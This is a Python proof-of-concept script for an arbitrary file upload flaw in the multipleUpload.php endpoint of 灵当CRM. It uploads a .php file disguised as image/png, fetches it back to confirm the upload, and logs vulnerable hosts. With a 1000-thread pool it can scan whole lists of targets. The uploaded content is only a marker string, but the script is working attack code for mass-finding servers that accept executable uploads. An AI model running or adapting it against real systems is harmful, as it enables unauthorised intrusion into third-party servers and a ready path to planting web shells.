import requests,argparse,sys,re,os
from multiprocessing.dummy import Pool
import json
import urllib
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="灵当CRM multipleUpload.php接口处存在文件上传漏洞")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(1000)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type': 'multipart/form-data; boundary=56c3d565ed97bd2177f000e50a5b5029',
        'Content-Length': '171'
    }
    data = '''--56c3d565ed97bd2177f000e50a5b5029\nContent-Disposition: form-data; name="file"; filename="64.php"\nContent-Type:?image/png\n\r\ntest11\n--56c3d565ed97bd2177f000e50a5b5029--'''
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    header1={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'

    }

    url = target+'/crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1'
    
    try:
        res = requests.post(url=url,headers=headers,timeout=5,data=data,verify=False)
        json_data = res.text
        data = json.loads(json_data)  
        file_name = data['name']  
        file_path = data['path']  
        url1 = f"{target}/crm/{urllib.parse.quote(file_path)}/{file_name}"    
        if res.status_code == 200:
            res1 = requests.get(url=url1,headers=header1,timeout=5,verify=False).text
            if 'test11' in res1:
                with open('uploadfile.txt','a') as fp1:
                    fp1.write(f"[+]{target} is veriable"+'\n')
            else:
                print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server erro')

if __name__ =='__main__':
    main()